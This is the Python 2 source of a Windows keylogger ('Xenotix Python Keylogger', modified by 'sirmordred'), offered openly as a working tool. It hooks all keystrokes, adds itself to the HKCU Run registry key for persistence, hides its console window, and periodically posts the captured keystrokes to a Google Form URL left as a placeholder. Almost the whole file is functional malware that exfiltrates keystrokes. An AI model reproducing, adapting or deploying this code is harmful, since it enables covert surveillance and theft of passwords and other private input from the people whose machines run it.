'''
Xenotix Python Keylogger for Windows
====================================
Coded By: Ajin Abraham <ajin25@gmail.com>

Modified by sirmordred 30/11/2016

Simple python keylogger which sends logs to goolge form directly

MINIMUM REQUIREMENTS
===================
Python 2.7: http://www.python.org/getit/
pyHook Module: http://sourceforge.net/projects/pyhook/
pyrhoncom Module: http://sourceforge.net/projects/pywin32/

pyHook Module - 
Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/

'''
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import urllib,urllib2
import smtplib
import datetime,time
import win32console,win32gui
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
data=''

def main():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)
    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)

    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    if len(data)>10:
        url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify Google Form URL here
        klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
        try:
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            data=''
        except Exception as e:
            print e

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
